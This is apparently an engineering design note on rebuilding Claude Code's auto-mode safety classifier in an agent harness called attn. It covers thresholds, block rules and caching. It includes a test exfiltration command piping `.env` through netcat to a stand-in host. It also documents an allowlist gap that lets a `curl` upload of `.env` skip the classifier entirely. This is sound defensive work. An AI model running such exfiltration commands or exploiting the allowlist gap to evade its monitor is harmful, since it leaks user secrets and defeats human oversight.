# Mirror Claude Code's auto mode classifier in attn

Garden: plot `s-jj4z72`.

attn's pi auto mode and Claude Code's auto mode answer the same question with
different machinery. On 2026-08-22 we watched CC's real classifier traffic and
captured both an allow and a block. CC's design is better on every point where
attn has already drawn blood, so we mirror it.

The ruling that governs everything below: auto mode works the way it works in
Claude Code, except the parts attn cannot or should not copy. Each divergence
in this doc names itself as one.

## How the receipts were taken

`ANTHROPIC_BASE_URL` pointed at a local Bun relay that logged every request and
response and forwarded to `api.anthropic.com`; credentials were redacted before
anything was written. `claude --permission-mode auto` ran in tmux against a
throwaway git repo holding a fake `.env`. 29 requests captured. Three stage-1
calls graded benign writes, and `base64 .env | nc paste.example 4444` produced a
stage-1 and a stage-2 call. Numbers below that are not from that capture come
from the 2.1.240 binary and say so.

## What CC does

**One request per stage, both on `claude-sonnet-5`.**

Stage 1 is cheap: `max_tokens: 64`, thinking disabled, and the answer is one
`<severity>N</severity>` tag closed by a stop sequence. It is forbidden to weigh
intent, in those words: "Stage 1 does NOT apply user intent or ALLOW exceptions
- stage 2 will handle those."

Stage 2 runs only above a threshold: `max_tokens: 8192`, `<thinking>` first,
then `<severity>N</severity><category>Exact BLOCK Rule Name</category>`.

**The thresholds are per model** (binary, `severityByModel`). For
`claude-sonnet-5` they are `{t1: 25, t2: 35}`: at or below 25 stage 1 allows
outright and stage 2 never runs, and stage 2 blocks above 35. The prompt tells
the model 50 is the allow/block line while the code cuts at 35, so the harness
is deliberately stricter than the instruction. `claude-opus-4-8` carries
`t1: 45`, and one call site uses `t2: 10`.

Observed: benign writes graded 3, no stage 2. The netcat exfiltration graded 93
at stage 1, then 98 with `<category>Data Exfiltration</category>`.

**The rulebook is one cached system block**: 119,893 characters carrying
`cache_control: {type: ephemeral, ttl: 1h}`, about 45,000 cached tokens read per
call.

**Exactly one hard block exists.** `Data Exfiltration`. The other 68 rules are
soft and user intent can clear them, including `Auto-Mode Bypass`,
`Self-Modification`, `Session Transcript Tampering` and `Logging/Audit
Tampering`. Stage 2's own words on the block we triggered:

> The user explicitly requested "run exactly this" - but Data Exfiltration is
> HARD BLOCK, and HARD BLOCK is never cleared by user intent, no matter how
> explicit.

**The transcript is projected, never truncated.** One small JSON object per
entry, tool results excluded:

```
{"user":"run wc -l on notes.txt and tell me the number"}
{"Bash":"wc -l notes.txt"}
```

Six entries came to 600 characters.

**The user's CLAUDE.md is its own uncapped message** (13,281 characters
observed) carrying a policy that says what it can authorize: a specific grant
naming the same operation and target counts, and generic encouragement does not
and "must not lower your block threshold".

**There is no verdict cache on the tool gate.** The only two classifier skips
are named in the binary - the safe allowlist, and calls that `acceptEdits`
would allow anyway. CC's one classifier cache belongs to a different gate, the
sandbox network classifier keyed `host:port`, and its policy is the inverse of
attn's old one: an allow is reusable only while the conversation has not moved,
a block sticks for the session, an outage is not remembered at all.

**Nothing is measured before the call.** CC has no pre-flight budget. It sends
the whole thing and learns from the provider: `transcript_too_long` is parsed
out of a `prompt is too long: N tokens > M` API error. That is why nobody has
ever seen it fire in a long CC session - it only fires when the API refuses.
When it does, CC hands the decision to the user: the permission dialog
interactively, an abort headless, deny under `dontAsk`.

## The decisions

Interviewed and settled 2026-08-22. Each row says what attn does and, where it
differs from CC, why.

| # | Question | Decision |
| --- | --- | --- |
| 1 | Hard blocks | One, like CC: `Data Exfiltration`. Auto-mode tampering becomes soft. |
| 2 | Verdict cache | None, like CC. The whole cache goes. |
| 3 | Stage models | attn's ordered lists per stage. **Divergence:** CC pins one model. |
| 4 | Thresholds | CC's 25 / 35, global named constants. Per-model when measured. |
| 5 | Breaker | Unchanged: 3 consecutive, 20 total. **Divergence:** CC has none. |
| 6 | Over budget | No pre-flight check. React to the provider's error, like CC. |
| 7 | Rulebook size | Grown substantially, attn's own prose, CC's rule names. |
| 8 | Allowlist shadowing | Left open, like CC. Seed `s-ypkx47` stays open. |
| 9 | Transcript window | Follows pi's context. **Divergence:** CC's is unbounded. |
| 10 | Stage 1 shape | Capped tokens, thinking at pi's floor. **Partly forced:** see below. |
| 11 | Prefix caching | Required. pi's `cacheControlFormat` already does it. |
| 12 | Cache key | Per attn session, per stage: two warm prefixes each. |
| 13 | Cache retention | `long`. pi defaults to `short`. |
| 14 | Too long | Block the call and open a turn. attn's permission dialog. |

### Why each divergence is one attn cannot or should not copy

**Model lists.** CC ships one model and knows its number. attn runs whatever
the user configured, and a model that cannot be reached must not silently
become an allow. The list is walked only on unreachability, never on a verdict.

**The breaker.** CC's classifier sits in front of a user who is watching. attn
runs sessions nobody is watching, so a session that has been refused twenty
times has to stop and ask rather than grind.

**The transcript window.** CC's transcript can grow until the API refuses it.
pi compacts, and a window holding turns pi has already dropped would judge a
call on a conversation that no longer exists. So the window follows pi: it
holds what pi still holds, and drops what pi drops.

**Stage one's shape.** CC closes stage one with a stop sequence and thinking
fully off. pi's `streamSimple` exposes no stop sequence at all, and its
`reasoning` bottoms out at `minimal`. So the cap does the work alone:
`harmMaxTokens` is 512, eight times the 60 output tokens glm-5.3 spent
answering one severity tag (2026-08-17). A stage-one answer cut short by the
cap parses as nothing and escalates to stage two, which is the safe direction.

**Thresholds.** CC's per-model table is measured against models we do not run.
25/35 are the only measured numbers we have; they are named constants, and the
s7 corpus is what will move them. They are not tripwires - every
classification passes through them.

### Two decisions that change the security posture

Both are the user's call, and both were made in the interview rather than
assumed:

**Auto-mode tampering stops being a boundary.** It moves to the clearable side,
leaving exfiltration alone as the thing a conversation cannot lift. What makes
this safe here and not merely a copy: auto mode's config is proposal-gated -
an agent can only reach `CreateAutoModeProposal`, and `PromoteAutoModeProposal`
has exactly one caller, a WebSocket command from the app. And `paths.ts`
statically refuses any path segment beginning `attn-automode`, unjudged, before
the classifier runs.

**The verdict cache goes.** It was the last remembered decision in the gate. An
allow that outlives the conversation it was judged in is a stale allow, and a
deny that outlives it blocks a retry the user just authorized. CC keeps
neither, and the two live places attn needs memory - the breaker counters and
the standing-denial widget - are not the gate.

## Mechanisms

**Following pi's context.** The window has no cap of its own - between
compactions it grows exactly as CC's does. pi fires `session_compact` after it
drops history, and the window empties there, so it can never carry turns pi has
already forgotten. The grant keeps its seat across a compaction: it is the
session's standing authorization, not a turn.

**Opening a turn on a too-long prompt.** attn has no permission dialog, but it
has the thing a dialog is for: `ctx.ui.confirm` blocking pi on the user while
`reportApprovalWindow` declares `pending_approval`, which opens an attn turn.
That is the breaker's existing path, and the too-long case takes it.

**Prefix caching.** The rulebook stays in the system prompt, which is what pi's
`cacheControlFormat: 'anthropic'` marks. `sessionId` drives `prompt_cache_key`
and the affinity headers; one per attn session per stage. `cacheRetention:
"long"` asks for the 24h window where the provider supports it.

## What ships

| | attn today | after |
| --- | --- | --- |
| transcript | full text, each entry cut to 4,000 chars head-and-tail | projected entries, nothing cut, following pi |
| tool calls | not in the transcript at all | projected in, like CC |
| opening message | reserved seat, 12,000-char cap | its own message, no cap, with the authorization policy |
| layers | same question twice; 2b escalates only an allow | stage 1 grades harm, stage 2 applies intent |
| verdict | allow / deny / uncertain | severity plus a category naming the matched rule |
| hard blocks | two: exfiltration, auto mode tampering | one: exfiltration |
| verdict cache | allow and deny remembered per intent | none |
| over budget | truncate and judge anyway | send it; block and ask when the API refuses |
| stage 1 cost | unbounded tokens | capped at 512, escalating if it overruns |
| caching | nothing passed to pi | session-keyed prefix cache, long retention |

## Gaps this does not close

An allow pattern still answers before the classifier runs, so a configured
`curl:*` shadows the exfiltration hard block entirely. Observed live in CC with
Victor's own settings: `curl -X POST --data-binary @.env` executed with no
classifier call. CC has the same hole, so mirroring keeps it. Seed `s-ypkx47`
holds the two questions - whether a hard block should outrank an allowlist, and
whether attn should say out loud which rule let something past.

The s7 corpus receipt for the new thresholds is still owed.
